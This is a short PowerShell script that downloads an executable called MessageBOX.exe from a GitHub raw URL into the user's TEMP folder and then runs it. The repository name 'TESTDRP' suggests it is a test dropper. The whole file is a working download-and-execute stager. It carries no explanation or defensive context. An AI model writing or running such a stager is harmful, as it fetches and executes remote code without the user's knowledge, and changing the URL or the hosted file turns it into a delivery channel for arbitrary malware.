$wc=New-Object System.Net.WebClient
$wc.DownloadFile("https://raw.githubusercontent.com/KONICHIVAA/TESTDRP/master/MessageBOX.exe", "$env:TEMP\MessageBOX.exe")
Start-Process "$env:TEMP\MessageBOX.exe"

